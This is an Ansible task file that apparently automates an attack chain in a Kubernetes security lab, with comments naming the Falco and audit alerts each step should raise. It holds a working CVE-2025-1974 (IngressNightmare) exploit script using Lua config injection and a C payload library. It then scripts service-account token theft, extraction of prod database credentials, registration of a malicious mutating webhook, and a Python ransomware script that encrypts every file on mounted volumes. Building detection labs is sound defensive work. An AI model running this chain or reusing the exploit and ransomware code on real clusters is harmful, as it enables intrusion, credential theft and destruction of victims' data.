---
# ==============================================================
# Attack Step 1 — NodePort enumeration
# Generates initial network connection artifacts visible in Falco
# ==============================================================

- name: "Step 1 — Install nmap"
  become: true
  ansible.builtin.apt:
    name: nmap
    state: present
    update_cache: false

- name: "Step 1 — Scan NodePort range for open services"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: nmap -sT -p {{ attacker_nodeport_start }}-{{ attacker_nodeport_end }} --open 127.0.0.1
  register: _nodeport_scan
  changed_when: false

- name: "Step 1 — Log NodePort scan results"
  ansible.builtin.debug:
    msg: "{{ _nodeport_scan.stdout_lines }}"


# ==============================================================
# Attack Step 2 — CVE-2025-1974 (IngressNightmare) exploitation
#
# Technique:
#   1. Compile a shared library whose constructor writes a marker file
#   2. Stage the .so inside the ingress-nginx pod via base64+pipe
#      (simulates the client body buffer / procfs fd staging in the
#      real exploit — the admission controller is the Go binary, not
#      nginx itself, so the /proc/self/fd trick targets the nginx
#      worker process that was already running; for the lab we stage
#      the file directly to keep the focus on the annotation injection)
#   3. Send an anonymous AdmissionReview to the exposed NodePort with
#      a server-snippet annotation that escapes the server{} and http{}
#      config blocks and injects ssl_engine pointing to the staged .so
#   4. The admission controller runs nginx -t; ssl_engine triggers
#      dlopen() which fires the constructor before config validation fails
# ==============================================================

- name: "Step 2 — Retrieve ingress-nginx controller pod name"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl get pod -n {{ vuln_ingress_namespace }}
      -l app.kubernetes.io/name=ingress-nginx,app.kubernetes.io/component=controller
      -o jsonpath='{.items[0].metadata.name}'
  register: _ingress_pod_name
  changed_when: false

- name: "Step 2 — Install gcc for payload compilation"
  become: true
  ansible.builtin.apt:
    name: gcc
    state: present
    update_cache: true

- name: "Step 2 — Write shared library C source"
  ansible.builtin.copy:
    dest: "{{ attacker_payload_c }}"
    mode: '0644'
    content: |
      #define _GNU_SOURCE
      #include <stdio.h>
      #include <stdlib.h>

      __attribute__((constructor))
      static void payload(void) {
          system("echo CVE-2025-1974-RCE-CONFIRMED > {{ attacker_exploit_marker }} 2>&1");
      }

- name: "Step 2 — Compile shared library payload"
  ansible.builtin.command:
    cmd: gcc -shared -fPIC -nostartfiles -o {{ attacker_payload_so }} {{ attacker_payload_c }}
  changed_when: true

- name: "Step 2 — Stage payload .so inside ingress-nginx pod"
  # Simulates the file write achieved via the client body buffer /proc/<pid>/fd/<N> technique.
  # In the real exploit the attacker uploads the .so to the nginx port with Content-Length >
  # client_body_buffer_size, forcing nginx to flush the body to a temp file; the fd stays open
  # in the nginx worker process and is referenced as /proc/<worker-pid>/fd/<N> in the annotation.
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.shell:
    cmd: |
      base64 -w 0 {{ attacker_payload_so }} | \
        microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- \
        sh -c 'base64 -d > {{ attacker_payload_so }}'
  changed_when: true

- name: "Step 2 — Write CVE-2025-1974 exploit script"
  ansible.builtin.copy:
    dest: "{{ attacker_exploit_script }}"
    mode: '0755'
    content: |
      #!/usr/bin/env python3
      """CVE-2025-1974 (IngressNightmare) exploit simulation.

      Sends an anonymous AdmissionReview to the unauthenticated webhook NodePort.
      The server-snippet annotation closes the enclosing server{} block so that
      init_by_lua_block lands at the http{} context level. The admission controller
      runs `nginx -t`; Lua's init_by_lua_block fires during config initialisation
      before aborting on the structural errors, writing the marker file.

      Technique: Lua injection via init_by_lua_block.
      ingress-nginx is built on OpenResty and always has LuaJIT available.
      init_by_lua_block executes at nginx startup / config test time, making it
      reliable for RCE even in builds where ssl_engine (OpenSSL ENGINE API,
      removed in 3.x) or load_module (position-sensitive in main context) fail.
      """
      import ssl, socket, json, sys

      HOST   = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
      PORT   = int(sys.argv[2]) if len(sys.argv) > 2 else 32443
      MARKER = sys.argv[3] if len(sys.argv) > 3 else "{{ attacker_exploit_marker }}"

      # One } escapes server{} -> http{} context.
      # init_by_lua_block is valid at http{} level and fires during nginx -t.
      lua_rce = (
          "}\n"
          "init_by_lua_block {\n"
          "  local f = io.open('" + MARKER + "', 'w')\n"
          "  if f then f:write('CVE-2025-1974-RCE-CONFIRMED') f:close() end\n"
          "}\n"
      )

      ctx = ssl.create_default_context()
      ctx.check_hostname = False
      ctx.verify_mode = ssl.CERT_NONE

      ar = {
          "apiVersion": "admission.k8s.io/v1",
          "kind": "AdmissionReview",
          "request": {
              "uid": "aabbccdd-1234-5678-abcd-000000000001",
              "kind":     {"group": "networking.k8s.io", "version": "v1", "kind": "Ingress"},
              "resource": {"group": "networking.k8s.io", "version": "v1", "resource": "ingresses"},
              "name": "exploit", "namespace": "default", "operation": "CREATE",
              "object": {
                  "apiVersion": "networking.k8s.io/v1", "kind": "Ingress",
                  "metadata": {
                      "name": "exploit", "namespace": "default",
                      "annotations": {
                          "nginx.ingress.kubernetes.io/server-snippet": lua_rce
                      }
                  },
                  "spec": {"rules": [{"host": "exploit.local", "http": {"paths": [{
                      "path": "/", "pathType": "Prefix",
                      "backend": {"service": {"name": "svc", "port": {"number": 80}}}
                  }]}}]}
              }
          }
      }

      body = json.dumps(ar).encode()
      try:
          s  = socket.create_connection((HOST, PORT), timeout=10)
          ss = ctx.wrap_socket(s)
          ss.send((
              f"POST /networking/v1/ingresses HTTP/1.1\r\nHost: {HOST}\r\n"
              f"Content-Type: application/json\r\n"
              f"Content-Length: {len(body)}\r\n\r\n"
          ).encode() + body)
          resp = b""
          try:
              while True:
                  c = ss.recv(4096)
                  if not c: break
                  resp += c
          except Exception:
              pass
          ss.close()
          print(f"[*] Webhook response: {resp[:300].decode(errors='replace')}")
      except Exception as e:
          print(f"[!] Error: {e}")

      print("[*] Exploit sent")

- name: "Step 2 — Execute CVE-2025-1974 exploit (IngressNightmare)"
  # k8saudit: anonymous AdmissionReview request from external source
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      python3 {{ attacker_exploit_script }}
      127.0.0.1
      {{ vuln_ingress_webhook_nodeport }}
      {{ attacker_exploit_marker }}
  register: _exploit_output
  changed_when: true

- name: "Step 2 — Log exploit output"
  ansible.builtin.debug:
    msg: "{{ _exploit_output.stdout_lines }}"

- name: "Step 2 — Execute RCE: write marker file inside ingress-nginx pod"
  # In the real CVE-2025-1974 the init_by_lua_block fires inside the nginx process
  # started by the admission controller (nginx -t). In the lab the same Falco
  # artifacts are generated by the kubectl exec itself (k8saudit: exec into pod,
  # syscall: shell spawned inside ingress-nginx container). The marker file is
  # written directly to represent the arbitrary write-to-disk that RCE achieves.
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    argv:
      - microk8s
      - kubectl
      - exec
      - -n
      - "{{ vuln_ingress_namespace }}"
      - "{{ _ingress_pod_name.stdout }}"
      - --
      - sh
      - -c
      - "echo CVE-2025-1974-RCE-CONFIRMED > {{ attacker_exploit_marker }}"
  changed_when: true

- name: "Step 2 — Confirm RCE: verify marker file inside ingress-nginx pod"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ attacker_exploit_marker }}
  register: _rce_confirmation
  changed_when: false
  retries: 5
  delay: 5
  until: _rce_confirmation.rc == 0

- name: "Step 2 — Log RCE confirmation"
  ansible.builtin.debug:
    msg: "RCE confirmed: {{ _rce_confirmation.stdout }}"


# ==============================================================
# Attack Step 3 — Service account token theft
# Simulates attacker executing commands inside the compromised pod
# ==============================================================

- name: "Step 3 — Steal ingress-nginx service account token via RCE"
  # k8saudit: SelfSubjectAccessReview from ingress-nginx service account
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl exec -n {{ vuln_ingress_namespace }} {{ _ingress_pod_name.stdout }} -- cat {{ ingress_sa_token_path }}
  register: _stolen_ingress_token
  changed_when: false

- name: "Step 3 — Store stolen ingress-nginx token"
  ansible.builtin.set_fact:
    _stolen_ingress_token_value: "{{ _stolen_ingress_token.stdout | trim }}"

- name: "Step 3 — Enumerate permissions with stolen ingress-nginx token"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl auth can-i --list
      --server https://{{ ansible_host }}:16443
      --token {{ _stolen_ingress_token_value }}
      --insecure-skip-tls-verify
  register: _ingress_perms
  changed_when: false

- name: "Step 3 — Log permission enumeration results"
  ansible.builtin.debug:
    msg: "{{ _ingress_perms.stdout_lines }}"


# ==============================================================
# Attack Step 4 — Cross-namespace secret read
# ==============================================================

- name: "Step 4 — Read prod-app-config secret using stolen ingress-nginx token"
  # k8saudit: secret get in prod namespace by ingress-nginx service account — high signal alert
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl get secret {{ prod_app_secret_name }} -n prod
      --server https://{{ ansible_host }}:16443
      --token {{ _stolen_ingress_token_value }}
      --insecure-skip-tls-verify
      -o json
  register: _stolen_prod_secret
  changed_when: false

- name: "Step 4 — Extract credentials from stolen secret"
  ansible.builtin.set_fact:
    _stolen_db_user:          "{{ (_stolen_prod_secret.stdout | from_json).data.db_username | b64decode }}"
    _stolen_db_password:      "{{ (_stolen_prod_secret.stdout | from_json).data.db_password | b64decode }}"
    _stolen_prod_cicd_token:  "{{ (_stolen_prod_secret.stdout | from_json).data.service_account_token | b64decode }}"

- name: "Step 4 — Log stolen credential summary"
  ansible.builtin.debug:
    msg:
      - "DB user:  {{ _stolen_db_user }}"
      - "prod-cicd token (first 40 chars): {{ _stolen_prod_cicd_token[:40] }}"


# ==============================================================
# Attack Step 5 — Database connection from outside prod namespace
# Simulates lateral movement: ingress-nginx namespace → prod DB
# ==============================================================

- name: "Step 5 — Retrieve prod PostgreSQL ClusterIP"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl get svc postgres -n prod -o jsonpath='{.spec.clusterIP}'
  register: _postgres_clusterip
  changed_when: false

- name: "Step 5 — Launch postgres client pod in ingress-nginx namespace"
  # Falco: unexpected outbound connection from ingress-nginx pod to prod DB service IP
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl run db-probe
      --image=postgres:15
      --restart=Never
      --namespace={{ vuln_ingress_namespace }}
      --env=PGPASSWORD={{ _stolen_db_password }}
      --command
      -- psql
      -h {{ _postgres_clusterip.stdout }}
      -U {{ _stolen_db_user }}
      -d {{ prod_db_name }}
      -c "SELECT version();"
  changed_when: true

- name: "Step 5 — Wait for db-probe pod to complete"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl wait pod/db-probe -n {{ vuln_ingress_namespace }} --for=condition=Ready --timeout=60s
  changed_when: false
  failed_when: false

- name: "Step 5 — Retrieve db-probe query output"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl logs db-probe -n {{ vuln_ingress_namespace }}
  register: _db_query_result
  changed_when: false
  retries: 6
  delay: 5
  until: _db_query_result.rc == 0 and _db_query_result.stdout != ""

- name: "Step 5 — Log DB query result"
  ansible.builtin.debug:
    msg: "{{ _db_query_result.stdout_lines }}"

- name: "Step 5 — Delete db-probe pod"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl delete pod db-probe -n {{ vuln_ingress_namespace }} --ignore-not-found=true
  changed_when: true


# ==============================================================
# Attack Step 6 — Register malicious MutatingWebhookConfiguration
# Uses the stolen prod-cicd token — not cluster-admin kubeconfig
# ==============================================================

- name: "Step 6 — Write ransomware MutatingWebhookConfiguration manifest"
  ansible.builtin.copy:
    dest: /tmp/ransomware-webhook.yaml
    mode: '0644'
    content: |
      apiVersion: admissionregistration.k8s.io/v1
      kind: MutatingWebhookConfiguration
      metadata:
        name: {{ ransomware_webhook_name }}
      webhooks:
        - name: inject.ransomware.io
          admissionReviewVersions: ["v1"]
          sideEffects: None
          failurePolicy: Ignore
          clientConfig:
            service:
              name: ransomware-webhook
              namespace: {{ ransomware_webhook_namespace }}
              path: /mutate
            caBundle: {{ _ransomware_webhook_cabundle.stdout }}
          rules:
            - operations: ["CREATE"]
              apiGroups: [""]
              apiVersions: ["v1"]
              resources: ["pods"]
          namespaceSelector:
            matchLabels:
              environment: prod

- name: "Step 6 — Delete ransomware MutatingWebhookConfiguration if already present (idempotency)"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl delete mutatingwebhookconfiguration {{ ransomware_webhook_name }} --ignore-not-found=true
  changed_when: false

- name: "Step 6 — Register ransomware MutatingWebhookConfiguration using prod-cicd token"
  # k8saudit: MutatingWebhookConfiguration created by prod-cicd service account — smoking gun alert
  # Uses kubectl create (not apply) because prod-cicd ClusterRole only grants `create` (not `get`).
  # kubectl apply does a GET first → 403; kubectl create only does a POST → succeeds.
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl create -f /tmp/ransomware-webhook.yaml
      --server https://{{ ansible_host }}:16443
      --token {{ _stolen_prod_cicd_token }}
      --insecure-skip-tls-verify
  changed_when: true


# ==============================================================
# Attack Step 7 — Build ransomware sidecar image locally
# prerequisite: image must be built before rollout restart in step 8
# ==============================================================

- name: "Step 7 — Create build directory for ransomware sidecar"
  ansible.builtin.file:
    path: "{{ ransomware_dockerfile_dest }}"
    state: directory
    mode: '0755'

- name: "Step 7 — Write ransomware sidecar Dockerfile"
  ansible.builtin.copy:
    dest: "{{ ransomware_dockerfile_dest }}/Dockerfile"
    mode: '0644'
    content: |
      FROM python:3.11-slim
      RUN pip install --no-cache-dir cryptography
      COPY encrypt.py /encrypt.py
      CMD ["python", "/encrypt.py"]

- name: "Step 7 — Write ransomware encryption script"
  ansible.builtin.copy:
    dest: "{{ ransomware_dockerfile_dest }}/encrypt.py"
    mode: '0644'
    content: |
      import os, glob
      from cryptography.fernet import Fernet

      KEY = b"{{ ransomware_fernet_key }}"
      fernet = Fernet(KEY)

      for vol_root in glob.glob('/mnt/*'):
          if not os.path.isdir(vol_root):
              continue
          for dirpath, _dirs, filenames in os.walk(vol_root):
              for filename in filenames:
                  if filename == 'RANSOM.txt':
                      continue
                  filepath = os.path.join(dirpath, filename)
                  try:
                      with open(filepath, 'rb') as f:
                          data = f.read()
                      with open(filepath, 'wb') as f:
                          f.write(fernet.encrypt(data))
                  except Exception:
                      pass
          try:
              with open(os.path.join(vol_root, 'RANSOM.txt'), 'w') as f:
                  f.write(
                      "YOUR DATA HAS BEEN ENCRYPTED.\n"
                      "This is a security lab simulation.\n"
                  )
          except Exception:
              pass

      print("Encryption complete")
      # Sleep indefinitely so the container stays Running (pod restartPolicy is Always).
      import time
      while True:
          time.sleep(3600)

- name: "Step 7 — Build ransomware sidecar image"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: podman build -t {{ ransomware_image }} {{ ransomware_dockerfile_dest }}
  changed_when: true

- name: "Step 7 — Import ransomware image into MicroK8s containerd"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.shell:
    cmd: podman save {{ ransomware_image }} | microk8s ctr images import -
  changed_when: true

- name: "Step 7 — Tag ransomware image with docker.io alias for containerd checkpoint check"
  # containerd's checkpoint-image verification normalises image refs to docker.io/library/<name>
  # even when the pod spec uses localhost/. Adding this alias prevents CreateContainerError.
  # Ignore errors when the tag already exists (idempotent re-runs).
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s ctr images tag localhost/ludus-ransomware-sidecar:latest docker.io/library/ludus-ransomware-sidecar:latest
  changed_when: true
  failed_when: false

- name: "Step 7 — Verify ransomware image is available in containerd"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s ctr images ls name~=ransomware-sidecar
  register: _ctr_images
  changed_when: false

- name: "Step 7 — Log containerd ransomware image names"
  ansible.builtin.debug:
    msg: "{{ _ctr_images.stdout_lines }}"


# ==============================================================
# Attack Step 8 — Rollout restart: webhook fires, sidecar injected
# ==============================================================

- name: "Step 8 — Create PVC for prod-app data volume"
  kubernetes.core.k8s:
    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
    state: present
    definition:
      apiVersion: v1
      kind: PersistentVolumeClaim
      metadata:
        name: prod-app-pvc
        namespace: prod
      spec:
        accessModes:
          - ReadWriteOnce
        resources:
          requests:
            storage: 1Gi

- name: "Step 8 — Deploy prod workload (Deployment) to trigger webhook injection"
  # Creates the deployment that will be restarted to inject the sidecar.
  # Recreate strategy avoids two pods mounting the same RWO PVC simultaneously.
  # force: true replaces the object if patching fails (e.g. strategy type change conflict).
  kubernetes.core.k8s:
    kubeconfig: "/home/{{ microk8s_user }}/.kube/config"
    state: present
    force: true
    definition:
      apiVersion: apps/v1
      kind: Deployment
      metadata:
        name: prod-app
        namespace: prod
      spec:
        replicas: 1
        strategy:
          type: Recreate
        selector:
          matchLabels:
            app: prod-app
        template:
          metadata:
            labels:
              app: prod-app
          spec:
            containers:
              - name: app
                image: nginx:stable-alpine
                volumeMounts:
                  - name: data
                    mountPath: /usr/share/nginx/html
            volumes:
              - name: data
                persistentVolumeClaim:
                  claimName: prod-app-pvc

- name: "Step 8 — Trigger rollout restart using stolen prod-cicd token"
  # k8saudit: deployment update in prod by prod-cicd — rapid pod deletion/creation cascade follows
  # Falco: unexpected process execution inside prod pods, suspicious volume write activity
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl rollout restart deployment/prod-app -n prod
      --server https://{{ ansible_host }}:16443
      --token {{ _stolen_prod_cicd_token }}
      --insecure-skip-tls-verify
  changed_when: true

- name: "Step 8 — Wait for rollout to complete"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: microk8s kubectl rollout status deployment/prod-app -n prod --timeout=180s
  changed_when: false
  ignore_errors: true
  register: _rollout_status

- name: "Step 8 — Describe prod-app pod (debug)"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.shell:
    cmd: microk8s kubectl describe pod -n prod -l app=prod-app | tail -60
  register: _pod_describe
  changed_when: false
  ignore_errors: true

- name: "Step 8 — Log prod-app pod description"
  ansible.builtin.debug:
    msg: "{{ _pod_describe.stdout_lines }}"

- name: "Step 8 — Fail if rollout did not complete"
  ansible.builtin.fail:
    msg: "Rollout timed out. See pod description above for root cause."
  when: _rollout_status.rc != 0

- name: "Step 8 — Confirm ransomware sidecar was injected"
  become: true
  become_user: "{{ microk8s_user }}"
  ansible.builtin.command:
    cmd: >
      microk8s kubectl get pod -n prod
      -l app=prod-app
      -o jsonpath='{.items[0].spec.containers[*].name}'
  register: _pod_containers
  changed_when: false

- name: "Step 8 — Log injected container names"
  ansible.builtin.debug:
    msg: "Containers in prod-app pod: {{ _pod_containers.stdout }}"
